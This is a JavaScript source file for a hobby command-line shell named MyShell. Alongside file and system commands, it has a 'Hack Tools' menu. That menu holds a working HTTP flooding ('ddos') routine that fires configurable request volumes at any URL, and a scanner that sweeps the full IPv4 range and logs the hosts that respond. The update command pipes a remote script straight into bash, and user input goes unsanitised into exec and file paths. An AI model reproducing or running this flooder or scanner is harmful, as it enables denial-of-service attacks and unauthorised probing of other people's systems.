//import module
import fs from "fs";
import promptSync from "prompt-sync";
const prompt = promptSync();
import os from "os";
import fetch from "node-fetch";
import { exec } from "child_process";
import { exit } from "process";

//prepeare
console.clear()
console.log("Starting...")


//setup variable
var comments = '';
let db = {}
let history = []
let lock = true
var dirs = os.homedir();
var renDirs = '';

//main js
const main = ()=>{
  fs.readFile("./db.json", "utf-8", (err, data)=>{
    if (err){
      console.error("Missing db.json");
      console.log("Creating db.json");
      fs.writeFile("./db.json", JSON.stringify({
        "Name": "SGStudio",
        "Machine": os.platform()
      }), err =>{ 
        if (err){
          console.error(`Error : ${err}`)
        }else {
          console.log("Succes Creating db.json")
          fs.writeFile("./history.json", JSON.stringify(["help"]), err =>{ 
            if (err){
              console.error(`Error : ${err}`)
            }else {
              console.log("Succes Creating history.json")
              setTimeout(()=>{ main() }, 1500)
            }
          })
        }
      })
    }else {
      db = JSON.parse(data);
      fs.readFile("./history.json", "utf-8", (error, datas)=>{
        if(error){
          console.error(`Missing history.json`);
          console.log("creating history.json")
          fs.writeFile("./history.json", JSON.stringify(["help"]), err =>{ 
            if (err){
              console.error(`Error : ${err}`)
            }else {
              console.log("Succes Creating history.json")
              setTimeout(()=>{ main() }, 1500)
            }
          })
        }else {
          history = JSON.parse(datas)
          if (db.Name == "SGStudio"){ comments = `You can Change Name with execute "setname"` }else { comments = 'Copyright By SGStudio' }
          console.log(`
          Arch : ${os.arch()}
          Ram : ${(os.freemem / 1000000000).toFixed(2)}GB / ${(os.totalmem() / 1000000000).toFixed(2)}GB
          Up Time : ${(os.uptime() / 3600 % 24).toFixed(0)}H ${(os.uptime % 3600 / 60).toFixed(0)}M

          "help"/"?" For Help
          ${comments}
          `)
          cmd();
        }
      })
    }
  })
}

//command line
const cmd = ()=>{
  var command = prompt(`${db.Name}@${db.Machine} | ${dirs} => `);
  history.push(command);
  search(command);
}

//search
const search = (item)=>{
  if (item == "clear"){
    console.clear();
    cmd();
  }else if (item == "help"||item == "?"){
    console.log(`
      mgr update //update Shell
      clear //for clear shell
      help //show command list
      runos <command> //run shell command
      tools <action> //Hack Tools
      log <string> //console log
      systeminfo //show system information
      version //console version
      setname //set console name or machine name
      read <path> //read file
      create dir <path> //create directory
      create file <name> //create file
      lh //List Here
      edir //enter dirs
      hdir //back to home dirs
      pdir //enter process dir
      remove <file> //Remove File
      remove --dir <dir> //Remove Dir
      exit //exit console
      `)
    cmd();
  }else if (item == "exit"){
    if (prompt("Exit? (y/n): ") == "y"){
      console.log("terminating...");
      fs.writeFile("./history.json", JSON.stringify(history), (err)=>{
        if(err){
          console.error(err);
          exit();
        }else{
          exit();
        }
      })
    }else {
      console.log("aborted");
      cmd();
    }
  }else if (item.substring(0, 5) == "runos"){
    if (item.substring(6) == ""){
      console.log("Please Insert Command");
      cmd();
    }else {
      console.log(`Running : ${item.substring(6)}`)
      exec(`${item.substring(6)}`, (error, stdout, stderr) => {
          if (error) {
              console.log(`error: ${error.message}`);
              // return;
          }
          if (stderr) {
              console.log(`stderr: ${stderr}`);
              // return;
          }
          console.log(stdout);
          cmd();
      });
    }
  }else if (item.substring(0, 5) == "tools"){
    tools(item.substring(6));
  }else if (item.substring(0, 3) == "log"){
    console.debug(item.substring(4));
    cmd();
  }else if (item == "systeminfo"){
    console.log(`
    -----SYSTEM-----
    Arch : ${os.arch()}
    CPU : ${os.cpus().map(data => { if (lock){ lock = false; return data.model; } })}
    Ram : ${(os.freemem / 1000000000).toFixed(2)}GB / ${(os.totalmem() / 1000000000).toFixed(2)}GB
    Home Dir : ${os.homedir()}
    Hostname : ${os.hostname()}
    IP : ${os.networkInterfaces().wlp3s0.map(data=>{ return data.address })}
    Platform : ${os.platform()}
    Release : ${os.release()}
    Version : ${os.version()}
    Up Time : ${(os.uptime() / 3600 % 24).toFixed(0)}H ${(os.uptime % 3600 / 60).toFixed(0)}M
    `)
    cmd();
  }else if (item == "version"){
    fs.readFile("./package.json", "utf-8", (err, data)=>{
      if (err){
        console.error("Error Read Version")
        cmd()
      }else {
        console.log(`
          -----Version-----
          Name : ${JSON.parse(data).name}
          Version : ${JSON.parse(data).version}
          Desc : ${JSON.parse(data).description}
          Author : ${JSON.parse(data).author}
          WA : 081228020195
        `)
        cmd()
      }
    })
  }else if (item == "setname"){
    console.log("-----Set Name-----");
    console.log("1.Set Name")
    console.log("2.Set Machine Name")
    console.log("0. Exit")
    let opt = prompt("Chose : ")
    if (opt == 1){
      db.Name = prompt("Name : ");
      fs.writeFile("./db.json", JSON.stringify(db), (err)=>{
        if(err){
          console.error("failed Write Change");
          cmd()
        }else{
          console.log("Change Saved")
          cmd()
        }
      })
    }else if (opt == 2){
      db.Machine = prompt("Machine : ");
      fs.writeFile("./db.json", JSON.stringify(db), (err)=>{
        if(err){
          console.error("failed Write Change");
          cmd()
        }else{
          console.log("Change Saved")
          cmd()
        }
      })
    }else{
      console.debug("aborted")
      cmd()
    }
  }else if(item.substring(0, 4) == "read"){
    fs.readFile(`${dirs}/${item.substring(5)}`, "utf-8", (err, data)=>{
      if(err){
        console.error(`Error : ${err}`);
        cmd();
      }else {
        console.log(data);
        cmd();
      }
    })
  }else if (item.substring(0, 6) == "create"){
    creates(item.substring(7));
  }else if (item == "lh"){
    exec(`ls ${dirs}`, (error, stdout, stderr) => {
      if (error) {
          console.log(`error: ${error.message}`);
          // return;
      }
      if (stderr) {
          console.log(`stderr: ${stderr}`);
          // return;
      }
      console.log(stdout);
      cmd();
  });
  }else if (item.substring(0, 6) == "remove"){
    if (item.substring(0, 12) == "remove --dir"){
      if(`${dirs}/${item.substring(13)}` == process.cwd()){
        console.log("Protected Dir");
        cmd();
      }else if (`${dirs}/${item.substring(13)}` == os.homedir()){
        console.log("Protected Dir");
        cmd();
      }else if (`${dirs}/${item.substring(13)}` == `${os.homedir()}/`){
        console.log("Protected Dir");
        cmd();
      }
      else if (`${dirs}/${item.substring(13)}` == `${process.cwd()}/`){
        console.log("Protected Dir");
        cmd();
      }else{
        fs.rmdir(`${dirs}/${item.substring(13)}`, err=>{
          if (err){
            console.error(`Error : ${err}`);
            cmd();
          }else {
            console.log(`Succesfully Remove ${item.substring(13)} Dirs`);
            cmd();
          }
        })
      }
    }else {
      if(`${dirs}/${item.substring(7)}` == `${process.cwd()}/main.js`){
        console.log("Protected File");
        cmd();
      }else{
        fs.rm(`${dirs}/${item.substring(7)}`, err=>{
          if (err){
            console.error(`Error : ${err}`);
            cmd();
          }else {
            console.log(`Succesfully Remove ${item.substring(7)} Files`);
            cmd();
          }
        })
      }
      
    }
  }else if (item.substring(0, 4) == "copy"){
    console.debug("Soon...")
  }else if(item.substring(0, 3) == "mgr"){
    manager(item.substring(4));
  }
  else if(item.substring(0, 4) == "edir"){
    renDirs = item.substring(5);
    dirs += `/${renDirs}`
    cmd();
  }else if(item == "pdir"){
    renDirs = ""
    dirs = process.cwd();
    cmd();
  }else if(item == "hdir"){
    renDirs = ""
    dirs = os.homedir();
    cmd();
  }
  else{
    console.error(`Command ${item} not Found`);
    cmd();
  }
}

//tools
const tools = (action)=>{
  if (action == "ddos"){
    console.log("starting ddos");
    const fpms = 100;
    const menu = ()=>{
      console.clear();
      console.log("1. DDOS Web/Ip");
      console.log("0. Exit");
      var opt = prompt("chose : ");
      if (opt == 0){
        cmd();
      }else if (opt == 1){
        var ip = prompt("IP : ");
        var methd = prompt("Method [GET/POST] : ");
        let cout = prompt("Req : ");
        let speed = prompt("Speed MS[1req/ms] : ");
        let limits = prompt("Limit Pending [100 pending stop] : ");
        let total = cout;
        let limit = 0, succes = 0, failed = 0, loglimit = 0, totals = 0;
        var log = ``;
        let lock = false;
        const display = ()=>{
          console.clear();
        console.log(`
  Send To : ${ip}
  Request Remeaining : ${cout} | ${(totals / total * 100).toFixed(2)}%
  Request : 1 Req/${speed}ms
  Pending : ${limit}
  Succes : ${succes}
  Failed : ${failed}
-------------------LOG--------------------
  ${log}
        `)
        }
        if (methd == `GET`||methd == `POST`&&ip.includes("http://")||ip.includes("https://")){
          let requ = setInterval(()=>{
            if (cout < 1){}else{
              if (loglimit > 19){
                log = ``
                loglimit=0;
              }else{
                if (limit > (limits-1)||lock){
                  lock = true;
                  if (limit < 1){
                    lock = false;
                  }else {
                    // limit--;
                  }
                }else {
                    cout--;
                    totals++;
                    limit++;
                    fetch(ip, { method: methd }).then((data)=>{
                      if (data.status == 200){
                        succes++;
                        limit--;
                        loglimit++;
                        log += `
  Succes ${methd} on ${ip} at req ${cout} status ${data.status} | ${data.statusText}`
                      }else {
                        failed++;
                        limit--;
                        loglimit++;
                        log += `
  Failed ${methd} on ${ip} at req ${cout} status ${data.status} | ${data.statusText}`
                      }
                    }).catch(()=>{
                      failed++;
                      limit--;
                      loglimit++;
                      log+=`
  Fetch Error, Check IP or Method`
                    })
                  //   log += `
                  // Succes`
                }
              }
            }
          }, speed)
          //display
          let ddos = setInterval(()=>{
            if (cout < 1){
              clearInterval(requ);
              if(limit < 1){
                clearInterval(ddos);
                display();
                console.log("DONE");
                cmd()
              }else { display() }
            }else {
              display()
            }
          }, fpms);
        }else{
          console.log("Invalid Method Or IP");
          setTimeout(() => {
            menu()
          }, 1000);
        } 
      }
      else {
        menu();
      }
    }
    menu()
  }else if (action == "help"){
    console.log(`
      ddos //ddos tools
      finder //IP Finder
      get //GET URL Information
      post //POST data or json
      post <json path> //POST file.json
    `)
    cmd();
  }else if (action == "get"){
    var IP = prompt("IP : ");
    console.debug("Getting Information")
    fetch(IP, {method: "GET"}).then((res)=>{
      console.log(`
      -----GET IP-----
      URL ${res.url}
      Type : ${res.type}
      Redirected : ${res.redirected}
      Status : ${res.status}
      Status Text : ${res.statusText}
      Ok : ${res.ok}
      `)
      cmd();
    }).catch(err =>{ console.error(`Error : ${err}`); cmd(); })
  }else if (action.substring(0, 4) == "post"){
    if (action.substring(5) == ""){
      var IP = prompt("IP : ");
      let reqData = prompt(`Data Body {"example": "example"}: `);
      console.log("Requesting...")
      fetch(IP, {
        method: "POST",
        mode: "cors",
        headers: { 'Content-Type': "application/json" },
        body: JSON.stringify(reqData)
      }).then(res => { console.log(res); cmd(); }).catch(err => { console.log(err); cmd(); })
    }else {
      var IP = prompt("IP : ");
      fs.readFile(action.substring(5), "utf-8", (err, data)=>{
        if (err){
          console.error(`Error : ${err}`)
          cmd()
        }else {
          fetch(IP, {
            method: "POST",
            mode: "cors",
            headers: { 'Content-Type': "application/json" },
            body: data
          }).then(res => { console.log(res); cmd(); }).catch(err => { console.log(err); cmd(); })
        }
      })
    }
  }else if (action == "finder"){
    let start = prompt("Start Ip [0]: ")
    let end = prompt("End Ip [0] : ")
    let head = prompt("Head Ip [0] : ")
    let tail = prompt("Tail Ip [0] : ")
    var methd = prompt("Method [GET, POST, PUT, DELETE] : ")
    let speed = prompt("Speed/req [1REQ/MS] : ")
    var IPS = "", IPA = "";
    let dbs = [{"ip": "TEMP", "type": "default", "Redirected": true, "status": 200, "statusText": "Ok", "size": "NULL", "URL": "TEMP"}]
    var log = ``;
    let total = 0, succes = 0, failed = 0, loglimit = 0;
    //display
    const refresh = ()=>{
      console.clear();
      console.log(`
IP : ${start}.${end}.${head}.${tail}
Total Try : ${total}
Method : ${methd}
Speed : 1REQ/${speed}MS
Succes : ${succes}
Failed : ${failed}
saved on lists-ip.txt
----------LOG-----------
${log}
      `)
    }
    const run = setInterval(() => {
      total++;
      if(loglimit > 19){
        loglimit = 0;
        log = ``;
      };
      fetch(`http://${start}.${end}.${head}.${tail}/`, { method: methd }).then(res => {
        if(res.status == "200"){
          succes++;
          loglimit++;
          dbs.push({"ip": `${start}.${end}.${head}.${tail}`, "type": res.type, "Redirected": res.redirected, "status": res.status, "statusText": res.statusText, "size": res.size, "URL": res.url})
          log += `
  Succes ${methd} at ${`http://${start}.${end}.${head}.${tail}/`} status ${res.status} | ${res.statusText}`
        }else {
          failed++;
          loglimit++;
          log += `
  Failed ${methd} at ${`http://${start}.${end}.${head}.${tail}/`} status ${res.status} | ${res.statusText}`
        }
      }).catch (err =>{
        failed++;
        loglimit++;
        log += `
  No Response ${methd} at ${`http://${start}.${end}.${head}.${tail}/`}`
      })
      tail++;
      if (tail > 255){
        tail = 0;
        head++;
      };
      if(head > 255){
        head = 0;
        end++;
      };
      if (end > 255){
        end = 0;
        start++;
      };
      if(start > 255){
        clearInterval(Display);
        clearInterval(run);
        clearInterval(Syncs);
        console.log("end")
        cmd()
      };
    }, speed);
    const Display = setInterval(() => {
      refresh()
    }, 100);
    const Syncs = setInterval(() => {
      fs.writeFile("./lists-ip.txt", JSON.stringify(dbs), err=>{
        if(err){
          loglimit++;
          log += `
    Error : ${err}`
        }else {
          loglimit++;
          log += `
    Data Synced`
        }
      })
    }, 2500);
  }
  else {
    console.error(`Try run "tools help"`);
    cmd();
  }
}

//create
const creates = (items) => {
  if (items.substring(0, 3) == "dir"){
    fs.mkdir(`${dirs}/${items.substring(4)}`, err => {
      if (err){
        console.error(`Error : ${err}`);
        cmd();
      }else {
        console.log(`Succes Create ${items.substring(4)} directory`);
        cmd()
      }
    })
  }else if (items.substring(0, 4) == "file"){
    fs.writeFile(`${dirs}/${items.substring(5)}`, "", err =>{
      if (err){
        console.error(`Error : ${err}`);
        cmd();
      }else {
        console.log(`Succes Create ${items.substring(4)} Files`);
        cmd()
      }
    })
  }
  else{
    console.error(`${items} Not Found`);
    cmd()
  }
}

const manager = (act)=>{
  if (act == "update"){
    console.log("Fetching Updates...")
    // https://raw.githubusercontent.com/Goldn7799/MyShell/main/package.json
    exec(`wget -O temp.txt https://raw.githubusercontent.com/Goldn7799/MyShell/main/package.json`, (error, stdout, stderr) => {
      if (error) {
          console.log(`error: ${error.message}`);
          // return;
          cmd()
      }else {
          fs.readFile("./temp.txt", "utf-8", (err, data)=>{
            if(err){
              console.error(`Error : ${err}`);
              cmd()
            }else {
              let info = JSON.parse(data);
              fs.readFile("./package.json", "utf-8", (error, datas)=>{
                if(error){
                  console.error(`Error : ${error}`);
                  cmd()
                }else {
                  let currentInfo = JSON.parse(datas);
                  if(currentInfo.version != info.version){
                    console.log(`Update Avabile`)
                    console.log(`Current : ${currentInfo.version}`)
                    console.log(`Avabile : ${info.version}`)
                    var ac = prompt("Update? [Y/N]: ");
                    if (ac == "Y"){
                      console.log("Downloading Updates.....")
                      exec(`curl https://raw.githubusercontent.com/Goldn7799/MyShell/main/update.sh | bash`, (errors, stdouts, stderrs)=>{
                        if (errors){
                          console.log(errors)
                          cmd()
                        }else{
                          console.log("Update Done, Try Relaunch")
                        }
                      })
                    }else{
                      console.log("aborted");
                      cmd();
                    }
                  }else{
                    console.log("No Update Avabile")
                    fs.rm("./temp.txt", err => {
                      cmd()
                    })
                  }
                }
              })
            }
          })
      }
  });
  }else if (act.substring(0, 7) == "install"){
    // exec("wget -O list.txt https://raw.githubusercontent.com/Goldn7799")
    console.log("soon")
    cmd()
  }
  else {
    console.error(act, "is not devined")
    cmd()
  }
}

const funny = (act)=>{
  if(act == "parrot"){
    // a
  }else {}
}

//start
main();